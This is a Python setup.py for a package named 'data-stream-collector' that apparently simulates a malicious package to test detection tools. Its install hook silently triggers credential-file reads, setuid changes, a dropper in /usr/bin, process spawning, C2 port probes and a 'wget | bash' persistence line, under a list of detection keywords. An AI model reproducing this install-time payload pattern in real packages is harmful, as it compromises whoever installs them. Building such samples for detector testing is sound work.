# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, base64, ctypes, mmap, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "src-get.xam1riel.surf"
PORTS = [6667, 9001]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket()
        s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    # DNS
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # HTTP GET
    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "User-Agent: data-stream-collector/1.3",
            "-H", "Authorization: Bearer stolen-token",
            "http://127.0.0.1:8080/api/config"
        ], capture_output=True, timeout=6)
    except: pass

    # etc=T
    for p in ["/etc/passwd","/etc/hosts","/etc/hostname","/etc/resolv.conf","/etc/os-release","/etc/group","/etc/shadow","/etc/ssh/sshd_config"]:
        try_open(p)
    for p in ["/root/.ssh/id_rsa","/root/.aws/credentials","/root/.bash_history"]:
        try_open(p)

    # file ops
    for i in range(80):
        p = f"/tmp/data_stream_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p, p+".renamed")
            os.unlink(p+".renamed")
        except: pass

    # priv=T
    try: os.system("chmod 777 /tmp/data_stream_target 2>/dev/null || true")
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/data_stream_target"], capture_output=True)
    except: pass

    # obfuscation
    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass

    # process injection
    try:
        ctypes.CDLL("libc.so.6").ptrace(0,0,None,None)
        m = mmap.mmap(-1,4096,prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
        m.write(b"\x90\x90\x90\x90")
    except: pass

    # persistence
    try: os.system("crontab -l >/tmp/cron_stream 2>&1 || true")
    except: pass
    try: open("/tmp/.profile_stream","a").write(f"wget -q {MALICIOUS_DOMAIN}/persist -O- | bash\n")
    except: pass

    # write_binary=T
    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/data_stream_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True)
    except: pass

    # spawned=T
    procs = []
    for i in range(15):
        try: procs.append(subprocess.Popen(["/bin/sh","-c",f"echo process-op; id; sleep 20"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except: pass

    # c2 ports: 6667, 9001
    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    time.sleep(60)
    for p in procs:
        try: p.kill()
        except: pass

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="data-stream-collector",
    version="1.3.0",
    description="Data stream collection utilities",
    packages=["data_stream_collector"],
    cmdclass={"install": PostInstall},
    install_requires=[],
)
